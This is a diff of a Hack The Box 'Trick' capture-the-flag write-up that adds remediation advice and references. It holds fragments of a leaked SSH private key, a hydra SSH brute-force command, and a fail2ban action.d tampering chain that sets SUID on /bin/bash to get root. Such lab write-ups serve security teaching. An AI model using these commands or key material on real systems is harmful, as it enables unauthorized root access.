-aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
-KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
-tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
-U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
-fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
-PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
-3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
-fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
-AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
-In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
-JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
-jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+...
 IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
----
-## User Flag
+The key is saved locally as `michael.key`, permissions are tightened, and it is used for SSH login.
+
+### SSH Access
 
 ```
+chmod 600 michael.key
 ssh michael@trick.htb -i michael.key
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Thu Sep 17 23:49:48 2026 from 10.10.15.80
-michael@trick:~$ sudo -l
-Matching Defaults entries for michael on trick:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User michael may run the following commands on trick:
-    (root) NOPASSWD: /etc/init.d/fail2ban restart
+```
 
 ```
+Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
+Last login: Thu Sep 17 23:49:48 2026 from 10.10.15.80
+michael@trick:~$
+```
+
+---
+
+## User Flag
 
 ```
 michael@trick:~$ cat user.txt
@@ -570,6 +291,7 @@ michael@trick:~$ cat user.txt
 ```
 
 ---
+
 ## Privilege Escalation
 
 ### Enumeration
@@ -577,14 +299,20 @@ michael@trick:~$ cat user.txt
 ```
 michael@trick:~$ id
 uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+```
+
+```
 michael@trick:~$ sudo -l
 Matching Defaults entries for michael on trick:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 User michael may run the following commands on trick:
     (root) NOPASSWD: /etc/init.d/fail2ban restart
-michael@trick:~$ 
 ```
+
+`michael` can restart the `fail2ban` service as root with no password. On its own this is a limited primitive (fail2ban re-reads its configuration on restart, but restarting it doesn't directly execute arbitrary commands) — the real value comes from what else `michael` can influence.
+
+`michael` also belongs to a non-default group, `security`. Searching for files owned by that group:
 
 ```
 michael@trick:~$ find / -group security 2>/dev/null
@@ -592,157 +320,94 @@ michael@trick:~$ find / -group security 2>/dev/null
 ```
 
 ```
-michael@trick:~$ find / -group users 2>/dev/null
-^C
-michael@trick:~$ find / -group security 2>/dev/null
-/etc/fail2ban/action.d
-^C
 michael@trick:~$ ls -la /etc/fail2ban/action.d
-total 288
 drwxrwx--- 2 root security  4096 Sep 18 14:42 .
-drwxr-xr-x 6 root root      4096 Sep 18 14:42 ..
--rw-r--r-- 1 root root      3879 Sep 18 14:42 abuseipdb.conf
--rw-r--r-- 1 root root       587 Sep 18 14:42 apf.conf
--rw-r--r-- 1 root root       629 Sep 18 14:42 badips.conf
--rw-r--r-- 1 root root     10918 Sep 18 14:42 badips.py
--rw-r--r-- 1 root root      2631 Sep 18 14:42 blocklist_de.conf
--rw-r--r-- 1 root root      3094 Sep 18 14:42 bsd-ipfw.conf
--rw-r--r-- 1 root root      2719 Sep 18 14:42 cloudflare.conf
--rw-r--r-- 1 root root      4669 Sep 18 14:42 complain.conf
--rw-r--r-- 1 root root      7580 Sep 18 14:42 dshield.conf
--rw-r--r-- 1 root root      1629 Sep 18 14:42 dummy.conf
--rw-r--r-- 1 root root      1501 Sep 18 14:42 firewallcmd-allports.conf
--rw-r--r-- 1 root root      2649 Sep 18 14:42 firewallcmd-common.conf
--rw-r--r-- 1 root root      2235 Sep 18 14:42 firewallcmd-ipset.conf
--rw-r--r-- 1 root root      1270 Sep 18 14:42 firewallcmd-multiport.conf
--rw-r--r-- 1 root root      1898 Sep 18 14:42 firewallcmd-new.conf
--rw-r--r-- 1 root root      2314 Sep 18 14:42 firewallcmd-rich-logging.conf
--rw-r--r-- 1 root root      1765 Sep 18 14:42 firewallcmd-rich-rules.conf
--rw-r--r-- 1 root root       589 Sep 18 14:42 helpers-common.conf
--rw-r--r-- 1 root root      1402 Sep 18 14:42 hostsdeny.conf
--rw-r--r-- 1 root root      1485 Sep 18 14:42 ipfilter.conf
--rw-r--r-- 1 root root      1417 Sep 18 14:42 ipfw.conf
--rw-r--r-- 1 root root      1426 Sep 18 14:42 iptables-allports.conf
--rw-r--r-- 1 root root      2738 Sep 18 14:42 iptables-common.conf
 -rw-r--r-- 1 root root      1339 Sep 18 14:42 iptables.conf
--rw-r--r-- 1 root root      2000 Sep 18 14:42 iptables-ipset-proto4.conf
--rw-r--r-- 1 root root      2197 Sep 18 14:42 iptables-ipset-proto6-allports.conf
--rw-r--r-- 1 root root      2240 Sep 18 14:42 iptables-ipset-proto6.conf
 -rw-r--r-- 1 root root      1420 Sep 18 14:42 iptables-multiport.conf
--rw-r--r-- 1 root root      2082 Sep 18 14:42 iptables-multiport-log.conf
--rw-r--r-- 1 root root      1497 Sep 18 14:42 iptables-new.conf
--rw-r--r-- 1 root root      2584 Sep 18 14:42 iptables-xt_recent-echo.conf
--rw-r--r-- 1 root root      2343 Sep 18 14:42 mail-buffered.conf
--rw-r--r-- 1 root root      1621 Sep 18 14:42 mail.conf
--rw-r--r-- 1 root root      1049 Sep 18 14:42 mail-whois-common.conf
--rw-r--r-- 1 root root      1754 Sep 18 14:42 mail-whois.conf
--rw-r--r-- 1 root root      2355 Sep 18 14:42 mail-whois-lines.conf
--rw-r--r-- 1 root root      5233 Sep 18 14:42 mynetwatchman.conf
--rw-r--r-- 1 root root      1493 Sep 18 14:42 netscaler.conf
--rw-r--r-- 1 root root       490 Sep 18 14:42 nftables-allports.conf
--rw-r--r-- 1 root root      4038 Sep 18 14:42 nftables-common.conf
--rw-r--r-- 1 root root       496 Sep 18 14:42 nftables-multiport.conf
--rw-r--r-- 1 root root      3697 Sep 18 14:42 nginx-block-map.conf
--rw-r--r-- 1 root root      1436 Sep 18 14:42 npf.conf
--rw-r--r-- 1 root root      3146 Sep 18 14:42 nsupdate.conf
--rw-r--r-- 1 root root       469 Sep 18 14:42 osx-afctl.conf
--rw-r--r-- 1 root root      2214 Sep 18 14:42 osx-ipfw.conf
--rw-r--r-- 1 root root      3662 Sep 18 14:42 pf.conf
--rw-r--r-- 1 root root      1023 Sep 18 14:42 route.conf
--rw-r--r-- 1 root root      2830 Sep 18 14:42 sendmail-buffered.conf
--rw-r--r-- 1 root root      1824 Sep 18 14:42 sendmail-common.conf
--rw-r--r-- 1 root root       857 Sep 18 14:42 sendmail.conf
--rw-r--r-- 1 root root      1773 Sep 18 14:42 sendmail-geoip-lines.conf
--rw-r--r-- 1 root root       977 Sep 18 14:42 sendmail-whois.conf
--rw-r--r-- 1 root root      1052 Sep 18 14:42 sendmail-whois-ipjailmatches.conf
--rw-r--r-- 1 root root      1033 Sep 18 14:42 sendmail-whois-ipmatches.conf
--rw-r--r-- 1 root root      1300 Sep 18 14:42 sendmail-whois-lines.conf
--rw-r--r-- 1 root root       997 Sep 18 14:42 sendmail-whois-matches.conf
--rw-r--r-- 1 root root      2068 Sep 18 14:42 shorewall.conf
--rw-r--r-- 1 root root      2981 Sep 18 14:42 shorewall-ipset-proto6.conf
--rw-r--r-- 1 root root      6134 Sep 18 14:42 smtp.py
--rw-r--r-- 1 root root      1330 Sep 18 14:42 symbiosis-blacklist-allports.conf
--rw-r--r-- 1 root root      1045 Sep 18 14:42 ufw.conf
--rw-r--r-- 1 root root      6082 Sep 18 14:42 xarf-login-attack.conf
-michael@trick:~$ cd /etc/fail2ban/action.d
-michael@trick:/etc/fail2ban/action
+...
 ```
+
+The `security` group has **read/write** access to `/etc/fail2ban/action.d`, the directory holding fail2ban's "action" definitions — the shell commands fail2ban executes whenever a jail bans or unbans an IP address. `fail2ban.conf`'s default jail (`sshd`) uses the `iptables-multiport` action, and combining that with the `sudo` rule above completes the chain: `michael` can rewrite what fail2ban does when it bans an IP, then force fail2ban to reload that logic as root.
+
 ### Exploitation
 
-copy the `iptables-multiport.conf ` in the home directory:
+The action file is copied out for editing:
 
 ```
 michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf .
 ```
 
-```
-michael@trick:~$ nano iptables-multiport.conf
-```
+The `actionban` directive — normally an `iptables` rule that blocks the offending IP — is replaced with a command that sets the SUID bit on `/bin/bash`:
 
-edit this line to the set the `SUID` on /bin/bash:
-
-```shell
-actionban = chmod u+s /bin/bash    
+```ini
+actionban = chmod u+s /bin/bash
 #actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
 ```
 
-replace the original file:
+The modified file is moved back into place, overwriting the original (writable thanks to `security` group membership):
 
 ```
 michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
 mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y
-
 ```
+
+fail2ban is restarted as root via the allowed `sudo` command so it picks up the tampered action file:
 
 ```
 michael@trick:~$ sudo /etc/init.d/fail2ban restart
 [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
 ```
 
-on kali brute force ssh to activate `fail2ban:
+To actually trigger the "ban" event (and therefore the malicious `actionban` command), the `sshd` jail needs to see enough failed login attempts from a single source to cross its threshold. A brute-force flood against SSH is used purely to generate that volume of failures — the credentials themselves are irrelevant:
 
 ```
 hydra 10.129.137.188 ssh -l root -P /usr/share/wordlists/rockyou.txt
-Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-18 09:44:44
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ssh://10.129.137.188:22/
-[STATUS] 226.00 tries/min, 226 tries in 00:01h, 14344175 to do in 1057:50h, 14 active
-[STATUS] 192.00 tries/min, 576 tries in 00:03h, 14343828 to do in 1245:08h, 11 active
-
-
-
 ```
 
-## Root flag
-
-Now /bin/bash has the `SUID` granting a shell as root.
+Once fail2ban's `sshd` jail bans the attacking IP, it invokes `iptables-multiport`'s `actionban`, which now runs `chmod u+s /bin/bash` **as root** (fail2ban's own service runs with root privileges):
 
 ```
-michael@trick:~$ ls -la /bin/bash
--rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
 michael@trick:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+```
+
+The `s` in the permission bits confirms the SUID bit is now set on `/bin/bash`. Invoking bash with `-p` (preserve privileges) yields a root-owned effective UID:
+
+```
 michael@trick:~$ /bin/bash -p
 bash-5.0# id
 uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
-bash-5.0# cat /root/root.txt
-7bcc6d11dcc64672dd4d8e8c103c4591
-bash-5.0# 
-
 ```
 
 ---
-## Remediation
 
-- Key takeaway 1
-- Key takeaway 2
-- Key takeaway 3
+## Root Flag
+
+```
+bash-5.0# cat /root/root.txt
+7bcc6d11dcc64672dd4d8e8c103c4591
+```
 
 ---
+
+## Remediation
+
+- **Unrestricted DNS zone transfer (AXFR):** Restrict zone transfers to explicitly authorized secondary nameservers (`allow-transfer` in BIND) and never allow AXFR from arbitrary clients. Zone data should not be treated as a source of "hidden" subdomains.
+- **SQL injection in the payroll login form:** Use parameterized queries / prepared statements for all database access. Never build SQL strings by concatenating unsanitized user input.
+- **Excessive database privileges:** The application's MySQL account should never have been granted the `FILE` privilege. Scope database accounts to the minimum privileges required (`SELECT`/`INSERT`/`UPDATE` on specific application tables only) and disable `FILE`/`SUPER` for web-facing accounts.
+- **Sensitive configuration disclosure:** Restrict filesystem permissions so that the MySQL service account cannot read files like `/etc/nginx/nginx.conf` or other configuration outside its own data directory.
+- **Local file inclusion / path traversal in the marketing site:** Never resolve a user-supplied `page` parameter directly against the filesystem. Use a strict allow-list of valid page identifiers mapped internally to fixed file paths.
+- **Private key readable via a web-facing PHP process:** `michael`'s SSH private key should never have been reachable by the web server user. Restrict `~/.ssh` permissions to `700`/`600` and ensure no other account or process (including PHP-FPM pools) can read it.
+- **Overly permissive `sudo` rule:** Granting `NOPASSWD` control over service restarts is dangerous when the service's own configuration is writable by the same user (directly or via group membership). Ensure any user permitted to restart a privileged service cannot also modify what that service executes.
+- **Group-writable fail2ban `action.d` directory:** Action definitions executed by fail2ban run with the privileges of the fail2ban service (root). This directory must be writable only by `root`; membership in a group with write access to it is equivalent to arbitrary root code execution the next time fail2ban reloads and triggers an action.
+
+---
+
 ## References
 
-- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
-- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
+- [ISC BIND — `allow-transfer` and Zone Transfer Security](https://bind9.readthedocs.io/en/latest/reference.html)
+- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [MySQL Documentation — `FILE` Privilege and `LOAD_FILE()`](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file)
+- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [fail2ban Documentation — Actions](https://fail2ban.readthedocs.io/en/latest/manpages/jail.conf.5.html)
+- [sqlmap Documentation](https://sqlmap.org/)
